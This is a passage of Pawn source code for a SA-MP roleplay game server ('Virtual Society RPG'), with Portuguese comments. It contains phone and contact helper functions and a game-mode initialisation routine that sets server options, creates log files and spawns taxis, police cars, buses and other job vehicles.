	    sep = strfind(data, STRINGIZE_CHAR(HSYS_SEP_CHAR), true);
	    strmid(buffer, data, sep+1, strlen(data));

	    if(strcmp(buffer, number, true) == 0)
		{
		    strmid(buffer, data, 0, sep);
		    fclose(fcell);
		    return buffer;
		}
	}

	fclose(fcell);
	return data;
}

stock GetPhoneId(const number[])
{
	new phone;
	
	phone = strval(number);
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
		if(IsPlayerConnected(n) && IsPlayerLogged(n) && GetPlayerPhone(n) == phone)
		    return n;
	}
	
	return INVALID_PLAYER_ID;
}

stock SendPhoneMessage(const playername[], const sender[], const message[])
{
	if(hGetInt(PHONES_FILE_PATH, playername) == 0)
	    return;
	    
	new File:mfile;
	new string[256], mpath[128];
	new day, mounth, year, id;
	
	mpath = GetPlayerNameMFilePath(playername);
	id = GetPlayerId(playername);
	getdate(year, mounth, day);
	
	format(string, sizeof string, "[ De: %s (%s - %s - %s) ]", sender, ToDate(day, mounth, year), Days[CurrentDay], ToTime(CurrentHour, CurrentMinute, -1));
	if(id != INVALID_PLAYER_ID)
	{
	    SendClientMessage(id, COLOUR_WHITE, "[ Nova mensagem recebida ]");
	    SendClientMessage(id, COLOUR_PURPLE, string);
	    SendClientMessage(id, COLOUR_WHITE, message);
	}
	
	format(string, sizeof string, "%s\r\n%s", string, message);
	if(!fexist(mpath))
		mfile = fopen(mpath, io_write);
		
	else
	    mfile = fopen(mpath, io_append);
	    
	fwrite(mfile, string);
	fwrite(mfile, "\r\n");
	fclose(mfile);
}

stock SetPlayerContact(playerid, contact, const name[], const number[])
{
	new kpath[128], key[128], data[128];
	
	kpath = GetPlayerKFilePath(playerid);
	format(key, sizeof key, "Contact%d", contact);
	
	if(!strlen(name) || !strlen(number))
		hUnset(kpath, key);

	else
	{
		format(data, sizeof data, "%s->%s", name, number);
    	hSetString(kpath, key, data);
	}
}

stock GetPlayerContact(playerid, contact, name[], number[])
{
	new key[128], data[128];
	new n, o;
	
	n = o = 0;
	format(key, sizeof key, "Contact%d", contact);
	data = hGetString(GetPlayerKFilePath(playerid), key);
	
	if(!strlen(data))
	{
	    name[0] = number[0] = '\0';
	    return -1;
	}
	
	while(n < strlen(data))
	{
	    if(data[n] == '-' && data[n+1] == '>')
	        break;
	        
	    name[n] = data[n];
	    ++n;
	}
	name[n] = '\0';
	
	n += 2;
	
	while(n < strlen(data))
	{
	    number[o++] = data[n++];
	}
	number[o++] = '\0';
	
	return 0;
}

stock RemovePlayerPhone(playerid)
	hUnset(PHONES_FILE_PATH, PlayerName(playerid));

stock RemovePlayerWantedPlayers(playerid)
{
    for(new mi = 0; mi < WantedPlayers[playerid]; mi++)
		RemovePlayerMapIcon(playerid, MAX_MAP_ICONS + mi);

	WantedPlayers[playerid] = 0;
}

public OnGameModeInit()
{
	print("Iniciando Virtual Society RPG...\n");
	SetGameModeText("Virtual Society RPG");
	SendRconCommand("hostname Virtual Society Server");
	SendRconCommand("mapname Los Santos");
	SendRconCommand("loadfs pstools");
	
	print("Configuracoes de servidor definidas.");
	
	AllowInteriorWeapons(true);
 	ShowPlayerMarkers(false);
	EnableStuntBonusForAll(false);
	DisableInteriorEnterExits();
	SetNameTagDrawDistance(NAME_TAG_DRAW_DISTANCE);
	
	print("Configuracoes de jogo definidas.");
	
	MaxServerVeh = 1;
	MaxHouse = CurrentTime = CurrentDay = CurrentWeather = 0;
	TestPlayerT = TestPlayerN = TestPlayerA = INVALID_PLAYER_ID;
	ColourType = COLOUR_TYPE_JOB;
	ColourValue = COLOUR_WHITE;
	TuneData[0] = INVALID_PLAYER_ID;
	TuneData[1] = -1;
	TuneData[2] = -1;
	TuneData[3] = -1;
	TuneData[4] = -1;
	
	if(fexist(GLOBAL_FILE_PATH))
	    LoadGlobalData();
	
	SetWorldTime(CurrentHour);
	
	print("Dados globais definidos.");

    logcreate("Chat", CHAT_REPORT_FILE_PATH);
    logcreate("Action's", ACTION_REPORT_FILE_PATH);
    logcreate("Pay's", PAY_REPORT_FILE_PATH);
    logcreate("Jobs", JOBS_REPORT_FILE_PATH);
    logcreate("Police", POLICE_REPORT_FILE_PATH);
    logcreate("Connection's", CONNECTION_REPORT_FILE_PATH);
    
#if USE_UCP == true

    logcreate("UCP", UCP_REPORT_FILE_PATH);

#endif

    print("Logs criados.");
    
    fcreate(ACCOUNTS_FILE_PATH);
	fcreate(BAN_FILE_PATH);
	fcreate(GLOBAL_FILE_PATH);
	fcreate(SERVER_VEHICLES_FILE_PATH);
	fcreate(GANGZONES_FILE_PATH);
	fcreate(GANGS_FILE_PATH);
	fcreate(COMPANIES_FILE_PATH);
	fcreate(PHONES_FILE_PATH);
	fcreate(BETS_FILE_PATH);

	print("Arquivos essenciais do servidor criados.");
	
    //----------------------------------------------CLASSES----------------------------------------------
    
    AddPlayerClass(101, -1983.3894, 152.8307, 27.6875, 86.9105, 0, 0, 0, 0, 0, 0);
    
    print("Classes definidas.");
	
	//----------------------------------------------VEÍCULOS----------------------------------------------

	//Taxis da história
	TAXI_HISTORY[0] = AddStaticServerVehicle(420, -1994.0032, 157.1385, 27.3179, 180.9080, 6, 1, -1, HISTORY_VIRTUAL_WORLD);
	TAXI_HISTORY[1] = AddStaticServerVehicle(420, -1447.8182, -281.7279, 13.7789, 66.3621, 6, 1, -1, HISTORY_VIRTUAL_WORLD);
	
	//Taxis
	TAXI[0] = AddStaticServerVehicle(438, 819.1214, -1331.0079, 13.4143, 269.7436, 6, 76, 1500);
	TAXI[1] = AddStaticServerVehicle(438, 831.4522, -1331.0288, 13.4109, 269.8347, 6, 76, 1500);
	TAXI[2] = AddStaticServerVehicle(438, 1731.8976, -1859.9222, 13.4936, 270.0624, 6, 76, 1500);
	TAXI[3] = AddStaticServerVehicle(438, 1751.7062, -1859.8851, 13.4937, 269.6627, 6, 76, 1500);
	TAXI[4] = AddStaticServerVehicle(438, 1764.4209, -1859.4241, 13.4925, 272.2686, 6, 76, 1500);
	TAXI[5] = AddStaticServerVehicle(420, 1602.3820, -2323.9858, 13.2405, 268.1321, 6, 1, 1500);
	TAXI[6] = AddStaticServerVehicle(420, 1590.0577, -2323.4314, 13.2433, 270.2686, 6, 1, 1500);
	TAXI[7] = AddStaticServerVehicle(420, 1673.9122, -2323.7222, 13.2412, 271.2279, 6, 1, 1500);
	TAXI[8] = AddStaticServerVehicle(420, 1664.6428, -2323.8582, 13.2406, 271.0942, 6, 1, 1500);
	TAXI[9] = AddStaticServerVehicle(420, 1691.2306, -2249.2820, 13.2406, 92.7289, 6, 1, 1500);
	TAXI[10] = AddStaticServerVehicle(420, 1702.7806, -2248.9688, 13.2395, 91.1600, 6, 1, 1500);
	TAXI[11] = AddStaticServerVehicle(420, 1714.4613, -2249.0461, 13.2408, 89.9985, 6, 1, 1500);
	TAXI[12] = AddStaticServerVehicle(420, 1622.0067, -2248.9336, 13.1951, 90.6844, 6, 1, 1500);
	TAXI[13] = AddStaticServerVehicle(420, 1632.3693, -2248.9099, 13.1889, 90.3802, 6, 1, 1500);
    
	//Viaturas policiais
	POLICE_CAR[0] = AddStaticServerVehicle(596, 1602.4550, -1692.0828, 5.6119, 87.6407, 0, 1, 1500);
	POLICE_CAR[1] = AddStaticServerVehicle(596, 1595.7861, -1710.6042, 5.6111, 180.9565, 0, 1, 1500);
	POLICE_CAR[2] = AddStaticServerVehicle(596, 1602.5198, -1704.5690, 5.6110, 268.2650, 0, 1, 1500);
	POLICE_CAR[3] = AddStaticServerVehicle(596, 1578.8854, -1710.8158, 5.6119, 4.2028, 0, 1, 1500);
	POLICE_CAR[4] = AddStaticServerVehicle(596, 1583.3650, -1709.7899, 5.6105, 0.6656, 0, 1, 1500);
	POLICE_CAR[5] = AddStaticServerVehicle(599, 1528.8562, -1688.0713, 6.0859, 268.7318, 0, 1, 1500);
	POLICE_CAR[6] = AddStaticServerVehicle(599, 1545.5343, -1684.3622, 6.0858, 271.6546, 0, 1, 1500);
	POLICE_CAR[7] = AddStaticServerVehicle(599, 1528.5190, -1684.2440, 6.0801, 271.2212, 0, 1, 1500);
	POLICE_CAR[8] = AddStaticServerVehicle(601, 1526.6083, -1646.1589, 5.6493, 181.0309, 1, 1, 1500);
	POLICE_CAR[9] = AddStaticServerVehicle(601, 1530.5721, -1645.4734, 5.6494, 180.0574, 1, 1, 1500);
	POLICE_CAR[10] = AddStaticServerVehicle(601, 1534.4719, -1644.5435, 5.6494, 181.6775, 1, 1, 1500);
	POLICE_CAR[11] = AddStaticServerVehicle(490, 1544.1970, -1659.1174, 6.0174, 90.1346, 0, 0, 1500);
	POLICE_CAR[12] = AddStaticServerVehicle(490, 1544.2947, -1655.3331, 6.0150, 89.0285, 0, 0, 1500);
	POLICE_CAR[13] = AddStaticServerVehicle(528, 1546.3007, -1671.9025, 5.9359, 271.3317, 0, 0, 1500);
	POLICE_CAR[14] = AddStaticServerVehicle(497, 1548.2708, -1609.3802, 13.5598, 266.4010, 0, 1, 1500);
	POLICE_CAR[15] = AddStaticServerVehicle(596, 1535.6702, -1677.3376, 13.1029, 182.2982, 0, 1, 1500);
	POLICE_CAR[16] = AddStaticServerVehicle(596, 1535.7382, -1668.7234, 13.1053, 179.9176, 0, 1, 1500);
    POLICE_CAR[17] = AddStaticServerVehicle(598, 612.2757, -597.2473, 16.9771, 269.9322, 0, 1, 1500);
	POLICE_CAR[18] = AddStaticServerVehicle(598, 611.9810, -601.9415, 16.9763, 270.7184, 0, 1, 1500);
	POLICE_CAR[19] = AddStaticServerVehicle(598, 621.8807, -610.7280, 16.8905, 90.3046, 0, 1, 1500);
	POLICE_CAR[20] = AddStaticServerVehicle(599, 610.7369, -591.8634, 17.4198, 270.0194, 0, 1, 1500);
	POLICE_CAR[21] = AddStaticServerVehicle(599, 610.6117, -587.5586, 17.4083, 270.8636, 0, 1, 1500);

	//Mobiletes de pizzas
	SCOOTER[0] = AddStaticServerVehicle(448, 2420.4075, -1506.1901, 23.6005, 225.0573, 1, 1, 1500);
	SCOOTER[1] = AddStaticServerVehicle(448, 2421.1982, -1502.3376, 23.5958, 224.3240, 1, 1, 1500);
	SCOOTER[2] = AddStaticServerVehicle(448, 2106.0051, -1823.7356, 13.1554, 149.8786, 3, 3, 1500);
	SCOOTER[3] = AddStaticServerVehicle(448, 2109.7458, -1823.9795, 13.1564, 165.3501, 3, 3, 1500);
	SCOOTER[4] = AddStaticServerVehicle(448, 2112.8423, -1823.9657, 13.1563, 162.9039, 3, 3, 1500);
	SCOOTER[6] = AddStaticServerVehicle(448, 925.7306, -1367.1132, 12.9862, 104.8732, 1, 1, 1500);
	SCOOTER[7] = AddStaticServerVehicle(448, 925.7845, -1370.7955, 12.9870, 107.2265, 1, 1, 1500);
	SCOOTER[8] = AddStaticServerVehicle(448, 925.7827, -1373.9515, 12.9919, 115.9917, 1, 1, 1500);
	SCOOTER[5] = AddStaticServerVehicle(448, 925.7880, -1377.5436, 12.9965, 111.0582, 1, 1, 1500);
	SCOOTER[9] = AddStaticServerVehicle(448, 1194.5109, -918.1219, 42.7635, 169.9314, 1, 1, 1500);
	SCOOTER[10] = AddStaticServerVehicle(448, 1192.2605, -918.1891, 42.7941, 159.0664, 1, 1, 1500);
	SCOOTER[11] = AddStaticServerVehicle(448, 1189.9200, -918.3164, 42.8225, 162.4739, 1, 1, 1500);
	SCOOTER[12] = AddStaticServerVehicle(448, 2107.9373, -1789.3097, 13.1599, 36.5274, 3, 3, 1500);
	SCOOTER[13] = AddStaticServerVehicle(448, 2113.0754, -1789.7708, 13.1563, 32.7196, 3, 3, 1500);
	SCOOTER[14] = AddStaticServerVehicle(448, 2119.3191, -1789.6335, 13.1539, 44.7330, 3, 3, 1500);
	SCOOTER[15] = AddStaticServerVehicle(448, 2386.4348, -1940.7319, 13.1463, 20.9274, 1, 1, 1500);
	SCOOTER[16] = AddStaticServerVehicle(448, 2384.2422, -1940.7759, 13.1462, 34.3919, 1, 1, 1500);
	SCOOTER[17] = AddStaticServerVehicle(448, 811.5091, -1622.5645, 13.1460, 320.0887, 1, 1, 1500);
	SCOOTER[18] = AddStaticServerVehicle(448, 811.4879, -1625.6501, 13.1471, 319.9782, 1, 1, 1500);

	//Ônibus
	BUS[0] = AddStaticServerVehicle(437, 1776.0012, -1900.8937, 13.5197, 359.5530, 3, 3, 1500);
	BUS[1] = AddStaticServerVehicle(437, 1780.5214, -1886.9775, 13.5053, 269.8320, 12, 5, 1500);
	BUS[2] = AddStaticServerVehicle(437, 1797.6726, -1887.0562, 13.5146, 269.6795, 10, 12, 1500);
	BUS[3] = AddStaticServerVehicle(437, 1804.8771, -1904.5969, 13.5126, 359.6853, 1, 0, 1500);
	BUS[4] = AddStaticServerVehicle(437, 1804.8460, -1917.3571, 13.5271, 359.8046, 0, 1, 1500);
	BUS[5] = AddStaticServerVehicle(437, 1776.0072, -1930.1928, 13.5191, 359.1499, 0, 0, 1500);
	BUS[6] = AddStaticServerVehicle(437, 1775.9615, -1914.3555, 13.5239, 359.0487, 2, 3, 1500);
	BUS[7] = AddStaticServerVehicle(437, 1786.7838, -1930.4063, 13.5207, 0.8778, 4, 7, 1500);
	BUS[8] = AddStaticServerVehicle(437, 1795.2592, -1930.3631, 13.5208, 1.3984, 12, 10, 1500);
	BUS[9] = AddStaticServerVehicle(437, 1804.3299, -1930.3337, 13.5208, 359.9374, 12, 10, 1500);

	//Trens
	TRAIN[0] = AddStaticServerVehicle(538, 1721.6516, -1953.7332, 13.9973, 89.7698, 1, 1, 1500);
	
	//Ambulâncias
	AMBULANCE[0] = AddStaticServerVehicle(416, 2008.2649, -1410.5100, 17.1400, 268.3522, 1, 3, 1500);
	AMBULANCE[1] = AddStaticServerVehicle(416, 2018.3779, -1410.5839, 17.1416, 272.0816, 1, 3, 1500);
	AMBULANCE[2] = AddStaticServerVehicle(416, 2036.9752, -1420.8744, 17.1415, 179.3431, 1, 3, 1500);
	AMBULANCE[3] = AddStaticServerVehicle(416, 2036.8904, -1432.9705, 17.2389, 179.5465, 1, 3, 1500);
	AMBULANCE[4] = AddStaticServerVehicle(416, 2036.7858, -1441.9711, 17.5422, 178.9464, 1, 3, 1500);
	AMBULANCE[5] = AddStaticServerVehicle(416, 1177.9268, -1339.1553, 14.0499, 268.5952, 1, 3, 1500);
	AMBULANCE[6] = AddStaticServerVehicle(416, 1177.7775, -1308.9033, 13.9982, 269.9618, 1, 3, 1500);
	AMBULANCE[7] = AddStaticServerVehicle(416, 1147.5266, -1312.9993, 13.8235, 1.6091, 1, 3, 1500);
	AMBULANCE[8] = AddStaticServerVehicle(416, 1147.5448, -1346.3115, 13.7885, 358.9389, 1, 3, 1500);
	AMBULANCE[9] = AddStaticServerVehicle(416, 299.9828, -1490.0820, 24.7430, 56.8459, 248, 26, 1500);
	AMBULANCE[10] = AddStaticServerVehicle(416, 301.4958, -1504.5507, 24.7465, 234.5104, 248, 26, 1500);
	AMBULANCE[11] = AddStaticServerVehicle(416, 293.3556, -1512.4993, 24.7427, 57.5819, 248, 26, 1500);
	AMBULANCE[12] = AddStaticServerVehicle(416, 295.3580, -1540.6005, 24.7428, 54.8311, 248, 26, 1500);
	AMBULANCE[13] = AddStaticServerVehicle(416, 278.1984, -1535.1519, 24.7441, 52.7579, 248, 26, 1500);
	AMBULANCE[14] = AddStaticServerVehicle(416, 281.5615, -1531.1526, 24.7434, 53.0637, 248, 26, 1500);
	AMBULANCE[15] = AddStaticServerVehicle(416, 298.9799, -1535.9163, 24.7432, 235.2808, 248, 26, 1500);

	//Reboques
	TOWTRUCK[0] = AddStaticServerVehicle(525, 2067.7021, -1880.4147, 13.4281, 1.5090, 0, 0, 1500);
	TOWTRUCK[1] = AddStaticServerVehicle(525, 2061.6379, -1881.1895, 13.4259, 4.3092, 0, 0, 1500);
	TOWTRUCK[2] = AddStaticServerVehicle(525, 2056.7617, -1881.2979, 13.4236, 359.1190, 0, 0, 1500);
	TOWTRUCK[3] = AddStaticServerVehicle(525, 2066.9209, -1865.5039, 13.4193, 272.7908, 0, 0, 1500);
	TOWTRUCK[4] = AddStaticServerVehicle(525, 1012.4976, -1007.5508, 31.9744, 0.9826, 17, 20, 1500);
	TOWTRUCK[5] = AddStaticServerVehicle(525, 1052.5576, -1028.1654, 31.9762, 90.7874, 17, 20, 1500);
	TOWTRUCK[6] = AddStaticServerVehicle(525, 2136.4192, -1122.1799, 25.3064, 264.0780, 17, 20, 1500);
	TOWTRUCK[7] = AddStaticServerVehicle(525, 2118.6643, -1123.9805, 25.2307, 179.7233, 17, 20, 1500);
	TOWTRUCK[8] = AddStaticServerVehicle(525, 2116.9741, -1155.8420, 24.2278, 178.7871, 17, 20, 1500);
	TOWTRUCK[9] = AddStaticServerVehicle(525, 2121.4861, -1156.4104, 23.9862, 5.2446, 17, 20, 1500);
	TOWTRUCK[10] = AddStaticServerVehicle(525, 1630.6492, -1844.8137, 13.4027, 2.2147, 6, 6, 1500);
	TOWTRUCK[11] = AddStaticServerVehicle(525, 1604.2238, -1836.8903, 13.3784, 90.3636, 6, 6, 1500);
    TOWTRUCK[12] = AddStaticServerVehicle(525, 1603.9979, -1825.0229, 13.3390, 271.6223, 6, 6, 1500);

	//Caminhões
	ROADTRAIN[0] = AddStaticServerVehicle(515, -25.9091, -1125.6276, 2.0959, 156.6339, 1, 1, 1500);
	ROADTRAIN[1] = AddStaticServerVehicle(515, -31.9627, -1122.5128, 2.0941, 159.2668, 1, 1, 1500);
	ROADTRAIN[2] = AddStaticServerVehicle(515, -41.1079, -1154.1105, 2.0997, 333.7027, 0, 0, 1500);
	ROADTRAIN[3] = AddStaticServerVehicle(515, -46.7881, -1151.2979, 2.1006, 334.2426, 0, 0, 1500);
	ROADTRAIN[4] = AddStaticServerVehicle(515, -54.1436, -1147.3413, 2.1026, 335.0638, 0, 0, 1500);
	ROADTRAIN[5] = AddStaticServerVehicle(515, -64.3376, -1143.3712, 2.0912, 334.5053, 3, 3, 1500);
	ROADTRAIN[6] = AddStaticServerVehicle(515, -76.9244, -1107.1552, 2.0981, 341.7137, 3, 3, 1500);
	ROADTRAIN[7] = AddStaticServerVehicle(515, -71.8078, -1108.9504, 2.0943, 336.4194, 4, 4, 1500);
	ROADTRAIN[8] = AddStaticServerVehicle(515, -64.4729, -1111.6241, 2.0977, 341.3115, 5, 5, 1500);
	ROADTRAIN[9] = AddStaticServerVehicle(515, -84.3087, -1137.0539, 2.0970, 65.5803, 6, 6, 1500);
	
	//Fazenda
	FARM[0] = AddStaticServerVehicle(531, -1067.3071, -1146.1510, 129.2188, 263.1791, 0, 0, 1500);
	FARM[1] = AddStaticServerVehicle(531, -1042.8000, -1113.4921, 129.2188, 172.3349, 0, 0, 1500);
	FARM[2] = AddStaticServerVehicle(532, -1180.1852, -1064.3158, 130.1944, 11.4957, 1, 1, 1500);
	FARM[3] = AddStaticServerVehicle(532, -1173.9580, -1063.5544, 130.1994, 9.6866, 1, 1, 1500);
	FARM[4] = AddStaticServerVehicle(532, -1169.0393, -1062.9961, 130.1862, 7.0070, 1, 1, 1500);
	
	//Contrabando
	SMUGGLING[0] = AddStaticServerVehicle(492, 2173.5430, -2265.4812, 13.1428, 41.9938, 16, 16, 500);
	SMUGGLING[1] = AddStaticServerVehicle(445, 2165.9097, -2273.1045, 13.2358, 39.6703, 32, 20, 500);
	SMUGGLING[2] = AddStaticServerVehicle(415, 2206.7341, -2289.6543, 14.5348, 25.1289, 45, 10, 500);
	SMUGGLING[3] = AddStaticServerVehicle(560, 2165.2048, -2307.9785, 13.2520, 156.6602, 13, 12, 500);
	SMUGGLING[4] = AddStaticServerVehicle(411, 2192.1260, -2247.6174, 13.3889, 44.0117, 17, 19, 500);
	
	//Carros Fortes
	SECURITY[0] = AddStaticServerVehicle(428, 2578.5046, 1984.3861, 10.9418, 90.5527, 0, 53, 1500);
	SECURITY[1] = AddStaticServerVehicle(428, 2577.9885, 1992.0502, 10.9567, 271.2229, 0, 53, 1500);
	SECURITY[2] = AddStaticServerVehicle(428, 2578.0092, 1976.8447, 10.9469, 90.3304, 0, 53, 1500);
	SECURITY[3] = AddStaticServerVehicle(428, 2579.0527, 1966.7509, 10.9496, 1.8499, 0, 53, 1500);
	SECURITY[4] = AddStaticServerVehicle(428, 2584.6330, 1966.8007, 10.9280, 0.0593, 0, 53, 1500);
	SECURITY[5] = AddStaticServerVehicle(428, 2590.5192, 1966.6300, 10.9495, 181.4025, 0, 53, 1500);
	SECURITY[6] = AddStaticServerVehicle(428, 2593.9833, 1971.0281, 10.9382, 89.7597, 0, 53, 1500);
	SECURITY[7] = AddStaticServerVehicle(428, 2594.1862, 1976.3116, 10.9907, 270.3471, 0, 53, 1500);
	SECURITY[8] = AddStaticServerVehicle(428, 2594.1608, 1981.7687, 10.9602, 269.7396, 0, 53, 1500);
	SECURITY[9] = AddStaticServerVehicle(428, 2578.9514, 1998.6267, 10.9499, 227.5459, 0, 53, 1500);
	
	//Limosines
	STRETCH[0] = AddStaticServerVehicle(409, 1280.0734, -1797.7181, 13.1863, 177.8034, 1, 1, 1500);
	STRETCH[1] = AddStaticServerVehicle(409, 1274.6337, -1797.8879, 13.1950, 356.9568, 1, 1, 1500);
	STRETCH[2] = AddStaticServerVehicle(409, 1268.4851, -1797.3123, 13.2061, 358.0037, 1, 1, 1500);
	STRETCH[3] = AddStaticServerVehicle(409, 1262.0447, -1797.3797, 13.2170, 0.1118, 1, 1, 1500);
	STRETCH[4] = AddStaticServerVehicle(409, 1256.7274, -1835.4940, 13.1876, 270.5202, 0, 0, 1500);
	STRETCH[5] = AddStaticServerVehicle(409, 1244.0842, -1835.6110, 13.1887, 270.5350, 0, 0, 1500);
	STRETCH[6] = AddStaticServerVehicle(409, 1228.9525, -1835.7530, 13.1881, 270.5344, 0, 0, 1500);
	STRETCH[7] = AddStaticServerVehicle(409, 1232.2500, -1826.6422, 13.2100, 88.9769, 0, 0, 1500);
	STRETCH[8] = AddStaticServerVehicle(409, 1214.6785, -1826.5358, 13.2103, 90.4510, 0, 0, 1500);
	STRETCH[9] = AddStaticServerVehicle(409, 1200.8917, -1826.6455, 13.2101, 90.4542, 0, 0, 1500);
	STRETCH[10] = AddStaticServerVehicle(409, 1199.1549, -1836.2418, 13.1985, 269.3879, 0, 0, 1500);
	STRETCH[11] = AddStaticServerVehicle(409, 1237.4311, -1818.0523, 13.2255, 179.9756, 0, 0, 1500);

	//Aviões
	PLANE[0] = AddStaticServerVehicle(519, 1719.0485, -2655.2248, 14.4678, 358.2554, 0, 0, 1500);
	PLANE[1] = AddStaticServerVehicle(519, 1788.8027, -2657.9541, 14.4688, 0.7354, 0, 0, 1500);
	PLANE[2] = AddStaticServerVehicle(519, 1932.8068, -2634.3125, 14.4689, 5.3231, 0, 0, 1500);
	PLANE[3] = AddStaticServerVehicle(519, 1982.9343, -2628.5612, 14.4665, 357.2268, 0, 0, 1500);
	PLANE[4] = AddStaticServerVehicle(476, 2074.6726, -2451.5886, 14.2651, 181.8478, 0, 16, 1500);
	PLANE[5] = AddStaticServerVehicle(476, 2098.8408, -2455.3740, 14.2541, 178.5420, 0, 32, 1500);
	PLANE[6] = AddStaticServerVehicle(476, 2137.5900, -2499.1823, 14.2722, 89.4030, 0, 63, 1500);
	PLANE[7] = AddStaticServerVehicle(476, 2139.2070, -2543.0258, 14.2671, 93.2064, 0, 25, 1500);
	PLANE[8] = AddStaticServerVehicle(476, 2135.4594, -2591.6157, 14.2711, 91.0261, 0, 0, 1500);
	PLANE[9] = AddStaticServerVehicle(487, 2127.8784, -2421.0288, 13.7236, 190.2188, 0, 1, 1500);
	PLANE[10] = AddStaticServerVehicle(487, 2105.7937, -2421.0620, 13.7237, 178.1793, 0, 1, 1500);

	//Trailers
	TRAILER[0] = AddStaticServerVehicle(435, 2195.1323, -2238.0019, 14.1693, 224.9304, 1, 1, 1500);
	TRAILER[1] = AddStaticServerVehicle(435, 2198.0839, -2235.0920, 14.2026, 224.4308, 1, 1, 1500);
	TRAILER[2] = AddStaticServerVehicle(435, 2201.6518, -2231.5996, 14.1520, 224.4376, 1, 1, 1500);
	TRAILER[3] = AddStaticServerVehicle(584, 2205.3312, -2227.4538, 14.7143, 223.1708, 1, 1, 1500);
	TRAILER[4] = AddStaticServerVehicle(584, 2208.8737, -2224.1408, 14.6732, 223.1707, 1, 1, 1500);
	TRAILER[5] = AddStaticServerVehicle(591, 2214.0603, -2219.1176, 14.1785, 225.7022, 1, 1, 1500);
	TRAILER[6] = AddStaticServerVehicle(591, 2219.8591, -2213.1726, 14.1963, 225.7022, 1, 1, 1500);

	//Caminhões de Lixo
	TRASHMASTER[0] = AddStaticServerVehicle(408, 2193.1089, -1998.9708, 14.0980, 0.6164, 26, 26, 1500);
	TRASHMASTER[1] = AddStaticServerVehicle(408, 2192.5977, -1988.6586, 14.1027, 358.8533, 26, 26, 1500);
	TRASHMASTER[2] = AddStaticServerVehicle(408, 2183.7729, -1976.1185, 14.0879, 271.5020, 26, 26, 1500);
	TRASHMASTER[3] = AddStaticServerVehicle(408, 2172.1758, -1976.4158, 14.1002, 270.6591, 26, 26, 1500);
	TRASHMASTER[4] = AddStaticServerVehicle(408, 2134.8611, -1992.3157, 14.1159, 46.7634, 26, 26, 1500);
	TRASHMASTER[5] = AddStaticServerVehicle(408, 2109.8235, -1977.1097, 14.0963, 84.5820, 26, 26, 1500);
	TRASHMASTER[6] = AddStaticServerVehicle(408, 2163.6826, -1971.4028, 14.1084, 89.2430, 26, 26, 1500);
	TRASHMASTER[7] = AddStaticServerVehicle(408, 2199.6853, -2008.7858, 14.0966, 204.4687, 26, 26, 1500);
	TRASHMASTER[8] = AddStaticServerVehicle(408, 2176.6897, -1989.8345, 14.0799, 225.5070, 26, 26, 1500);
	TRASHMASTER[9] = AddStaticServerVehicle(408, 2188.8103, -1957.3350, 14.0817, 312.1083, 26, 26, 1500);
	TRASHMASTER[10] = AddStaticServerVehicle(408, 2196.0942, -1951.3110, 14.1013, 314.1055, 26, 26, 1500);

    //Veículos de Jornal
    NEWS[0] = AddStaticServerVehicle(582, 784.3352, -1334.6821, 13.5970, 180.9193, 28, 1, 1500);
	NEWS[1] = AddStaticServerVehicle(582, 784.9918, -1381.4732, 13.7454, 179.1368, 28, 1, 1500);
	NEWS[2] = AddStaticServerVehicle(582, 771.2732, -1383.0634, 13.7487, 271.4456, 28, 1, 1500);
	NEWS[3] = AddStaticServerVehicle(582, 770.9789, -1332.1108, 13.6019, 268.7138, 28, 1, 1500);
	NEWS[4] = AddStaticServerVehicle(582, 759.2692, -1373.3521, 13.6101, 179.7464, 28, 1, 1500);
	NEWS[5] = AddStaticServerVehicle(582, 783.6256, -1370.2388, 13.6036, 269.3164, 28, 1, 1500);
	NEWS[6] = AddStaticServerVehicle(582, 782.3480, -1356.6580, 13.6003, 90.7807, 28, 1, 1500);
	NEWS[7] = AddStaticServerVehicle(582, 782.7422, -1342.7020, 13.5944, 92.3662, 28, 1, 1500);
	NEWS[8] = AddStaticServerVehicle(488, 740.1388, -1336.7260, 13.7178, 269.2817, 28, 1, 1500);
	NEWS[9] = AddStaticServerVehicle(488, 739.2801, -1347.8876, 13.6882, 269.7373, 28, 1, 1500);

	//Submissões
	ICE_CREAM = AddStaticServerVehicle(423, 1573.7091, -1879.7478, 13.5747, 89.9082, 1, 1, 1500);
	IML = AddStaticServerVehicle(442, 940.2975, -1087.1194, 23.8630, 88.1389, 1, 1, 1500);
	CEMENT = AddStaticServerVehicle(524, 2413.6775, -2470.0376, 13.1957, 313.8671, 1, 1, 1500);
	POST = AddStaticServerVehicle(552, 2674.9082, -1968.9242, 13.1448, 273.4729, 1, 1, 1500);
	
	//Auto Escola - Carros
	DRIVING_SCHOOL_CAR[0] = AddStaticServerVehicle(410, 1778.4686, -2076.3037, 13.2469, 90.6574, 3, 3, 500);
	DRIVING_SCHOOL_CAR[1] = AddStaticServerVehicle(410, 1766.9196, -2076.3057, 13.2610, 90.4201, 3, 3, 500);
	DRIVING_SCHOOL_CAR[2] = AddStaticServerVehicle(410, 1769.3566, -2022.6123, 13.7949, 271.5938, 3, 3, 500);
	DRIVING_SCHOOL_CAR[3] = AddStaticServerVehicle(410, 1784.2090, -2041.7047, 13.1850, 270.2375, 3, 3, 500);
	DRIVING_SCHOOL_CAR[4] = AddStaticServerVehicle(521, 1773.0260, -2061.4858, 13.1724, 0.2121, 3, 3, 500);
	DRIVING_SCHOOL_CAR[5] = AddStaticServerVehicle(521, 1765.9749, -2041.0818, 13.1276, 270.1337, 3, 3, 500);
	DRIVING_SCHOOL_CAR[6] = AddStaticServerVehicle(410, 1751.5083, -2056.9053, 13.4299, 179.9104, 3, 3, 500);
	DRIVING_SCHOOL_CAR[7] = AddStaticServerVehicle(410, 1802.9364, -2064.8848, 13.2192, 179.6280, 3, 3, 500);
	DRIVING_SCHOOL_CAR[8] = AddStaticServerVehicle(410, 1798.5068, -2064.8064, 13.2257, 179.8395, 3, 3, 500);
	
	//Auto Escola - Avião
	DRIVING_SCHOOL_PLANE[0] = AddStaticServerVehicle(519, 1692.2711, -2451.8022, 14.4767, 182.7362, 0, 0, 500);
	
	//Auto Escola - Barco
	DRIVING_SCHOOL_BOAT[0] = AddStaticServerVehicle(493, 728.0335, -1495.4415, -0.0825, 181.0754, 3, 3, 500);
	
    MaxServerVeh = CreateVehicle(400, 0.0, 0.0, 0.0, 0.0, 0, 0, 0);
    DestroyVehicle(MaxServerVeh);
	
	//Veículos a venda
	for(new veh = 0; veh < sizeof VehiclesForSale; veh++)
	{
		new string[128];
		new model, model_type, colour1, colour2;
		
		model_type = VehiclesForSale[veh][osModelType];
		
		if(model_type == MODEL_TYPE_CAR)
		    model = RandomCarModel();
		    
		if(model_type == MODEL_TYPE_BIKE)
